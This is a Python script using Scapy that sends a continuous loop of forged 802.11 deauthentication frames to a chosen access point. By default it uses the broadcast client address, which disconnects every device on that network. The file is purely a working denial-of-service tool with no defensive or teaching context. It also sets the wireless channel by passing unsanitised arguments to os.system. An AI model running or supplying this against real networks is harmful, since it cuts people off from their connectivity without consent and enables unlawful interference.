import argparse
from scapy.all import *
import time
import os


def perform_deauth(bssid, client, iface):

	packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
	sendp(packet, iface=iface, inter=0.5, loop=1, verbose=0)

def attackTarget(bssid, iface):
	"""
	Attack the target
	"""
	print ("\n\n")
	print ('='*100)
	# Now we have a bssid that we have detected, let's get the client MAC
	target_client = input('Enter a client MAC address (Default: FF:FF:FF:FF:FF:FF): ')
	if not target_client: target_client = 'FF:FF:FF:FF:FF:FF'
	print ("\n\n")
	print ('='*100)

	perform_deauth(bssid, target_client, iface)

def main():
	#Set the command line options
	parser = argparse.ArgumentParser( description='attack.py - Send Deauth packets')
	parser.add_argument('-i', '--interface', dest='iface', type=str, required=True, help='WIFI Interface')
	parser.add_argument('-c', '--channel', dest='channel', type=int, required=True, help='Wifi Channel')
	parser.add_argument('-b', '--bssid', dest='bssid', type=str, required=True, help='BSSID')
	#Get the command line options
	args = parser.parse_args()
	#start the attack

	cmd = 'iwconfig {0} channel {1}'.format(args.iface, args.channel)
	os.system(cmd)

	attackTarget(args.bssid, args.iface)

if __name__ == "__main__":
	main()
